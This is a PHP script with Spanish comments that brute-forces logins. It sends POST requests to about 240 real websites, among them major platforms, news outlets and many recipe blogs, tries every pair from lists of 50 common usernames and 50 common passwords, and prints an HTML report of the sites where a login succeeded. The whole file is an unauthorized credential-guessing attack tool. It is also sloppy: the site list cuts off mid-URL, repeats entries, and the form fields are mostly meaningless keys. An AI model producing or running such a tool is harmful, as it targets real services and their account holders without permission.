<?php

// Iniciar el buffer de salida
ob_start();

set_time_limit(1800); // Aumenta el tiempo de ejecución a 30 minutos

// Lista de URLs para probar
$urls = [
    "https://www.google.com",
    "https://www.youtube.com",
    "https://www.facebook.com",
    "https://www.wikipedia.org",
    "https://www.amazon.com",
    "https://www.twitter.com",
    "https://www.instagram.com",
    "https://www.linkedin.com",
    "https://www.reddit.com",
    "https://www.ebay.com",
    "https://www.netflix.com",
    "https://www.cnn.com",
    "https://www.bbc.com",
    "https://www.nytimes.com",
    "https://www.espn.com",
    "https://www.weather.com",
    "https://www.microsoft.com",
    "https://www.apple.com",
    "https://www.tumblr.com",
    "https://www.pinterest.com",
    "https://www.quora.com",
    "https://www.medium.com",
    "https://www.imdb.com",
    "https://www.hulu.com",
    "https://www.spotify.com",
    "https://www.adobe.com",
    "https://www.github.com",
    "https://www.stackoverflow.com",
    "https://www.salesforce.com",
    "https://www.oracle.com",
    "https://www.dropbox.com",
    "https://www.zoom.us",
    "https://www.slack.com",
    "https://www.airbnb.com",
    "https://www.uber.com",
    "https://www.booking.com",
    "https://www.tripadvisor.com",
    "https://www.khanacademy.org",
    "https://www.coursera.org",
    "https://www.edx.org",
    "https://www.udacity.com",
    "https://www.udemy.com",
    "https://www.wikipedia.org",
    "https://www.britannica.com",
    "https://www.healthline.com",
    "https://www.webmd.com",
    "https://www.mayoclinic.org",
    "https://www.nih.gov",
    "https://www.cdc.gov",
    "https://www.bloomberg.com",
    "https://www.forbes.com",
    "https://www.wsj.com",
    "https://www.nbcnews.com",
    "https://www.usatoday.com",
    "https://www.abcnews.go.com",
    "https://www.cnbc.com",
    "https://www.foxnews.com",
    "https://www.aljazeera.com",
    "https://www.rt.com",
    "https://www.theguardian.com",
    "https://www.nationalgeographic.com",
    "https://www.newyorker.com",
    "https://www.economist.com",
    "https://www.time.com",
    "https://www.wired.com",
    "https://www.techcrunch.com",
    "https://www.theverge.com",
    "https://www.engadget.com",
    "https://www.mashable.com",
    "https://www.cnet.com",
    "https://www.arstechnica.com",
    "https://www.gizmodo.com",
    "https://www.zdnet.com",
    "https://www.buzzfeed.com",
    "https://www.huffpost.com",
    "https://www.recode.net",
    "https://www.vulture.com",
    "https://www.slate.com",
    "https://www.vox.com",
    "https://www.politico.com",
    "https://www.thedailybeast.com",
    "https://www.motherjones.com",
    "https://www.thenation.com",
    "https://www.reason.com",
    "https://www.nationalreview.com",
    "https://www.theatlantic.com",
    "https://www.salon.com",
    "https://www.propublica.org",
    "https://www.washingtonexaminer.com",
    "https://www.thehill.com",
    "https://www.breitbart.com",
    "https://www.realclearpolitics.com",
    "https://www.axios.com",
    "https://www.theintercept.com",
    "https://www.rollcall.com",
    "https://www.thedailywire.com",
    "https://www.seekingalpha.com",
    "https://www.fool.com",
    "https://www.marketwatch.com",
    "https://www.investopedia.com",
    "https://www.finviz.com",
    "https://www.money.cnn.com",
    "https://www.businessinsider.com",
    "https://www.marketplace.org",
    "https://www.wsj.com/market-data",
    "https://www.morningstar.com",
    "https://www.barrons.com",
    "https://www.bbcgoodfood.com",
    "https://www.allrecipes.com",
    "https://www.foodnetwork.com",
    "https://www.bonappetit.com",
    "https://www.seriouseats.com",
    "https://www.epicurious.com",
    "https://www.chowhound.com",
    "https://www.simplyrecipes.com",
    "https://www.yummly.com",
    "https://www.spoonforkbacon.com",
    "https://www.kingarthurbaking.com",
    "https://www.joyofbaking.com",
    "https://www.101cookbooks.com",
    "https://www.smittenkitchen.com",
    "https://www.minimalistbaker.com",
    "https://www.tasteofhome.com",
    "https://www.skinnytaste.com",
    "https://www.cookieandkate.com",
    "https://www.gimmesomeoven.com",
    "https://www.loveandlemons.com",
    "https://www.twopeasandtheirpod.com",
    "https://www.ohsheglows.com",
    "https://www.thekitchn.com",
    "https://www.eatingwell.com",
    "https://www.delish.com",
    "https://www.thepioneerwoman.com",
    "https://www.simplysrecipes.com",
    "https://www.food.com",
    "https://www.tasty.co",
    "https://www.myrecipes.com",
    "https://www.seriouseats.com",
    "https://www.marthastewart.com",
    "https://www.bettycrocker.com",
    "https://www.bonappetit.com",
    "https://www.foodandwine.com",
    "https://www.saveur.com",
    "https://www.cookingchanneltv.com",
    "https://www.pbs.org/food",
    "https://www.eater.com",
    "https://www.howsweeteats.com",
    "https://www.browneyedbaker.com",
    "https://www.bakerella.com",
    "https://www.biggerbolderbaking.com",
    "https://www.bakeorbreak.com",
    "https://www.davidlebovitz.com",
    "https://www.bunsinmyoven.com",
    "https://www.sweetapolita.com",
    "https://www.lifeloveandsugar.com",
    "https://www.melskitchencafe.com",
    "https://www.sprinklebakes.com",
    "https://www.handletheheat.com",
    "https://www.savorynothings.com",
    "https://www.sallysbakingaddiction.com",
    "https://www.littlesweetbaker.com",
    "https://www.cupcakeproject.com",
    "https://www.iambaker.net",
    "https://www.preppykitchen.com",
    "https://www.sweetandsavorymeals.com",
    "https://www.bakefromscratch.com",
    "https://www.sprinklesforbreakfast.com",
    "https://www.thebakefeed.com",
    "https://www.jamieoliver.com",
    "https://www.halfbakedharvest.com",
    "https://www.thecurvycarrot.com",
    "https://www.thedomesticrebel.com",
    "https://www.momontimeout.com",
    "https://www.averiecooks.com",
    "https://www.hummingbirdhigh.com",
    "https://www.queenbeebaker.com",
    "https://www.thekitchenmccabe.com",
    "https://www.chocolatecoveredkatie.com",
    "https://www.lovebakesgoodcakes.com",
    "https://www.rumblytumbly.com",
    "https://www.fifteenspatulas.com",
    "https://www.whatsgabycooking.com",
    "https://www.inspiredbycharm.com",
    "https://www.cookienameddesire.com",
    "https://www.biscuitsandburlap.com",
    "https://www.justataste.com",
    "https://www.cookiesandcups.com",
    "https://www.onesarcasticbaker.com",
    "https://www.thenovicechefblog.com",
    "https://www.cakescottage.com",
    "https://www.sweetapolita.com",
    "https://www.bakedbyanintrovert.com",
    "https://www.thissillygirlskitchen.com",
    "https://www.callmecupcake.se",
    "https://www.sugarhero.com",
    "https://www.crunchycreamysweet.com",
    "https://www.kleinworthco.com",
    "https://www.laurenslatest.com",
    "https://www.theviewfromgreatisland.com",
    "https://www.thekitchenmagpie.com",
    "https://www.amodernhomestead.com",
    "https://www.tastesoflizzyt.com",
    "https://www.bakingamoment.com",
    "https://www.chelseasmessyapron.com",
    "https://www.shugarysweets.com",
    "https://www.bakeorbreak.com",
    "https://www.bakerella.com",
    "https://www.biggerbolderbaking.com",
    "https://www.handletheheat.com",
    "https://www.twopeasandtheirpod.com",
    "https://www.loveandlemons.com",
    "https://www.ohsheglows.com",
    "https://www.thekitchn.com",
    "https://www.eatingwell.com",
    "https://www.delish.com",
    "https://www.thepioneerwoman.com",
    "https://www.simplyrecipes.com",
    "https://www.food.com",
    "https://www.tasty.co",
    "https://www.myrecipes.com",
    "https://www.seriouseats.com",
    "https://www.marthastewart.com",
    "https://www.bettycrocker.com",
    "https://www.bonappetit.com",
    "https://www.foodandwine.com",
    "https://www.saveur.com",
    "https://www.cookingchanneltv.com",
    "https://www.pbs.org/food",
    "https://www.eater.com",
    "https://www.howsweeteats.com",
    "https://www.browneyedbaker.com",
    "https://www.bakerella.com",
    "https://www.biggerbolderbaking.com",
    "https://www.bakeorbreak.com",
    "https://www.davidlebovitz.com",
    "https://www.buns"
];
// Credenciales a probar
$usernames = [
    'admin', 'administrator', 'root', 'user', 'guest', 'test', 'support', 'manager', 'superuser', 'owner',
    'admin1', 'admin2', 'admin3', 'admin4', 'user1', 'user2', 'user3', 'user4', 'operator', 'webmaster',
    'moderator', 'developer', 'team', 'staff', 'login', 'service', 'account', 'customer', 'client', 'accountant',
    'sales', 'ceo', 'executive', 'adminuser', 'superadmin', 'poweruser', 'system', 'itadmin', 'rootuser',
    'sysadmin', 'webadmin', 'helpdesk', 'techsupport', 'it', 'rootadmin', 'serviceuser', 'guestuser', 'info',
    'security', 'network'
];
$passwords = [
    'password', '123456', '123456789', 'qwerty', 'abc123', 'password1', 'letmein', 'welcome', '123123', 'admin',
    'admin123', 'password123', '1234', '12345', '12345678', 'qwertyuiop', 'monkey', 'letmein123', 'password1',
    'admin1', 'admin2', 'admin3', 'qwerty1', 'qwerty123', 'sunshine', 'princess', 'football', 'iloveyou',
    'welcome1', 'welcome123', 'password2', '1234567', '1q2w3e4r', 'passwords', 'qwerty12', 'qwerty1234',
    '123321', 'password1234', 'letmein1234', 'qwerty12', 'password1', 'adminadmin', '123qwe', 'welcome1234',
    'monkey123', 'adminpassword', 'qwerty12345', 'p@ssw0rd', '1q2w3e4r5t', '123abc'
];
// Arrays para almacenar los resultados
$accessibleSites = [];
$inaccessibleSites = [];

// Función para probar las credenciales
function check_credentials($url, $username, $password) {
    $postData = [
       'username' => $username,
        'password' => $password,
        'usuario' => $username,
        'password' => $password,
        'administrador' => $username,
        'contraseña' => $password,
        'admin' => $username,
        'contra' => $password,
        '123456' => $password,
        '1234' => $password,
        'root' => $username,
        'guest' => $username,
        'test' => $username,
        'support' => $username,
        'manager' => $username,
        'superuser' => $username,
        'owner' => $username,
        'admin1' => $password,
        'password1' => $password,
        'qwerty' => $password,
        'abc123' => $password,
        'letmein' => $password,
        'welcome' => $password,
        '123123' => $password,
        'letmein123' => $password,
        'admin123' => $password,
        'password123' => $password,
        'test123' => $password,
        'guest123' => $password
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($postData));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    return ($httpCode == 200 && strpos(strtolower($response), "login successful") !== false);
}

// Probar todas las combinaciones de URLs y credenciales
foreach ($urls as $url) {
    $found = false;
    foreach ($usernames as $username) {
        foreach ($passwords as $password) {
            if (check_credentials($url, $username, $password)) {
                $result = "URL: $url, Usuario: $username, Contraseña: $password";
                $accessibleSites[] = $result;
                $found = true;
                break 2; // Salir de los dos bucles si se encuentran credenciales correctas
            }
        }
    }
    if (!$found) {
        $inaccessibleSites[] = "URL: $url";
    }
}

// Mostrar los resultados finales en formato HTML
echo "<!DOCTYPE html>";
echo "<html lang='es'>";
echo "<head>";
echo "<meta charset='UTF-8'>";
echo "<meta name='viewport' content='width=device-width, initial-scale=1.0'>";
echo "<title>Resultados de Acceso </title>";
echo "</head>";
echo "<body>";

echo "<h1>Resultados de Acceso a Sitios Web</h1>";

echo "<h2>Sitios accesibles:</h2>";
foreach ($accessibleSites as $site) {
    echo "$site<br>";
}

echo "<h2>Sitios inaccesibles:</h2>";
foreach ($inaccessibleSites as $site) {
    echo "$site<br>";
}

echo "</body>";
echo "</html>";

// Finalizar el buffer de salida y enviar el contenido al navegador
ob_end_flush();
?>
